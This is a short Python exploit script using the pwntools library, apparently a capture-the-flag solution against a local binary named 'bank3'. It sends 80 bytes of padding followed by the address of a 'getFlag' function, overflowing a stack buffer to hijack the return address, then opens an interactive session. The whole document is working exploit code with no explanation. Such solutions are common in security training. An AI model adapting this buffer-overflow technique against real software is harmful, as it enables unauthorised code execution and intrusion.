from pwn import *

context.binary = elf = ELF('./bank3')
p = process(elf.path)

p.sendline(b'x'*80 + p32(elf.symbols['getFlag']))

p.interactive()